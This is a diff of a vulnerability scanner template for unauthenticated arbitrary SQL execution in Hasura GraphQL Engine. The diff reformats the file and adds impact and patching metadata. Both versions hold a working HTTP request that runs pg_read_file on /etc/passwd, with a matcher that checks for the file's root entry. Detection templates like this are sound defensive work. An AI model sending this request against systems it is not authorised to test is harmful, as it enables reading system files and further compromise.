@@ -1,45 +1,34 @@
 id: hasura-graphql-psql-exec
-
 info:
   name: Hasura GraphQL Engine - Remote Code Execution
   author: Udyz
   severity: critical
-  description: Hasura GraphQL Engine allows remote unauthenticated users to execute arbitrary SQL statements via the '/v2/query' endpoint (aka remote code execution).
+  description: Hasura GraphQL Engine is vulnerable to remote code execution, allowing
+    unauthenticated users to execute arbitrary SQL statements via the '/v2/query'
+    endpoint.
   reference:
-    - https://www.exploit-db.com/exploits/49802
+  - https://www.exploit-db.com/exploits/49802
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: graphql,edb,hasura,rce
-
+  metadata:
+    impact: The impact of the vulnerability in Hasura GraphQL Engine's remote code
+      execution allows unauthorized users to execute malicious SQL statements, potentially
+      causing data loss or system compromise.
+    recommendation: It is recommended that immediate action be taken to patch the
+      vulnerability in the Hasura GraphQL Engine to prevent remote code execution
+      by unauthenticated users.
 requests:
-  - raw:
-      - |
-        POST /v2/query HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
-
-        {
-          "type": "bulk",
-          "source": "default",
-          "args":[
-            {
-              "type": "run_sql",
-              "args": {
-                "source":"default",
-                "sql":"SELECT pg_read_file('/etc/passwd',0,100000);",
-                "cascade": false,
-                "read_only": false
-              }
-            }
-          ]
-        }
-
-    matchers:
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
-        part: body
-
-# Enhanced by mp on 2022/06/01
+- raw:
+  - "POST /v2/query HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
+    \n{\n  \"type\": \"bulk\",\n  \"source\": \"default\",\n  \"args\":[\n    {\n\
+    \      \"type\": \"run_sql\",\n      \"args\": {\n        \"source\":\"default\"\
+    ,\n        \"sql\":\"SELECT pg_read_file('/etc/passwd',0,100000);\",\n       \
+    \ \"cascade\": false,\n        \"read_only\": false\n      }\n    }\n  ]\n}\n"
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+    part: body
